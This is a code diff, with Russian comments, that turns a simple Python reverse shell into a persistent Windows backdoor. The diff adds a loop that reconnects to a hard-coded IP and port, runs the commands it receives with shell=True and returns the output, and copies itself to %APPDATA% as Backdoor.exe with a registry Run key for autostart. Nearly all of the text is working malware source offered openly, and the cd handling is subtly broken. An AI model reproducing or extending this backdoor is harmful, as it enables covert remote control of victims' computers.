@@ -2,11 +2,17 @@
 import socket
 import subprocess
 import json
+import time
+import os
+import shutil
+import sys
 
+#конвектирует данные пайтона в джейсон а его в свою очередь в байты
 def reliable_send(data):
         json_data = json.dumps(data).encode()
         sock.send(json_data)
 
+#отправляет большие данные по частям
 def reliable_recv():
         json_data = b""
         while True:
@@ -16,11 +22,27 @@ def reliable_recv():
                 except ValueError:
                         continue
 
+#повторное подключение
+def connection():
+        while True:
+                time.sleep(20)
+                try:
+                        sock.connect(("192.168.178.67", 54321))
+                        shell()
+                except:
+                        connection()
+
+#получает команды, выполняет и потом отправляет результаты на сервер
 def shell():
         while True:
                 command = reliable_recv()
                 if command == "q":
                         break
+                elif command[:2] == "cd" and len(command) > 1:
+                        try:
+                                os.chdir(command[:3])
+                        except:
+                                continue
                 else:
                         try:
                                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
@@ -30,8 +52,12 @@ def shell():
                         except:
                                 reliable_send("[!!] Cant Execute That Command")
 
+#создание автозапуска в реестре
+location = os.environ["appdata"] + "\\Backdoor.exe"
+if not os.path.exists(location):
+        shutil.copyfile(sys.executable, location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor REG_SZ /d "' + location + '"', shell=True)
+
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.connect(("127.0.0.1", 54321))
-print("Connection Established To Server")
-shell()
+connection()
 sock.close()
